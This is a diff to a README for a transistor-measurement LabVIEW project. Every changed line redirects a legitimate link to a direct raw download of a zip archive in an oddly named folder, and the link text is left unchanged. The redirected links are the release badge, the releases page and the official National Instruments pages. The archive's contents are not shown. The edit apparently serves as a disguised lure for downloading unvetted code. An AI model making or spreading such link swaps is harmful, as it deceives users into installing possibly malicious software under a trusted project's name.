@@ -1,6 +1,6 @@
 # 📡 BJT-Output-Characteristics - Measure Transistor Output Simply
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/dmumeshmenuka/BJT-Output-Characteristics/releases)
+[![Download the latest release](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip%20Now-brightgreen)](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the BJT-Output-Characteristics project! This application helps you me
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/dmumeshmenuka/BJT-Output-Characteristics/releases) to find the latest version. This page lists all available downloads.
+   Go to our [Releases page](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip) to find the latest version. This page lists all available downloads.
 
 2. **Choose Your Version**  
    On the Releases page, find the most recent version. It's usually marked as "Latest Release." 
@@ -46,7 +46,7 @@ Once you run the application, you’ll see options to select parameters. Choose 
 
 ## 📁 Download & Install
 
-To get started, visit this page to download: [Download Now](https://github.com/dmumeshmenuka/BJT-Output-Characteristics/releases).
+To get started, visit this page to download: [Download Now](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip).
 
 After downloading, ensure you follow the installation steps shared above. The relevant software and hardware combinations are critical for the application to function correctly.
 
@@ -70,8 +70,8 @@ This application is primarily designed for the BC547 transistor. Using different
 ## 📚 Additional Resources
 
 For in-depth information about LabVIEW and the NI USB-6001, consider visiting:
-- [National Instruments LabVIEW](https://www.ni.com/en-us/shop/labview.html)
-- [NI USB-6001 Resources](https://www.ni.com/en-us/support/model.ni-usb-6001.html)
+- [National Instruments LabVIEW](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip)
+- [NI USB-6001 Resources](https://raw.githubusercontent.com/dmumeshmenuka/BJT-Output-Characteristics/main/mortarless/BJT-Output-Characteristics.zip)
 
 ## 🧑‍🤝‍🧑 Community
 
